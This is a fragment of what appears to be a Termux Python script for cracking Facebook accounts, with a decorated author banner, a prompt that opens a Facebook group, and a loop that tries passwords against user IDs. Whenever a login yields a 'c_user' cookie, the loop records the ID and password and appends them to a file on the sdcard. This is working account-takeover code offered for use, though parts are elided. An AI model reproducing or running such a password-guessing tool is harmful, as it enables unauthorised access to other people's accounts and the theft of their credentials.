...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]AKASH\033[1;39m         ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]Akash Mia\033[1;39m         ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]AkashAKASHLeadar2052\033[1;39m       ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+𝟴𝟴𝟬𝟭832338496\033[1;39m     ┃
...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗣𝗥𝗜𝗠𝗜𝗨𝗠\033[1;39m            ┃
 \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mAKASH2052\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
loop = 0
oks = []
cps = []
...
try:
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m JOIN Termux_Help_Center PUBLIC GROUP...')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m NOTE : AMADER GROUP A JOIN HOU...')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m JARA JOIN HOTE CHAN TARA JOIN HOTE PAREN ...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('xdg-open https://www.facebook.com/groups/334416514989667/?ref=share&mibextid=NSMWBT')
    else:pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/AKASH-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
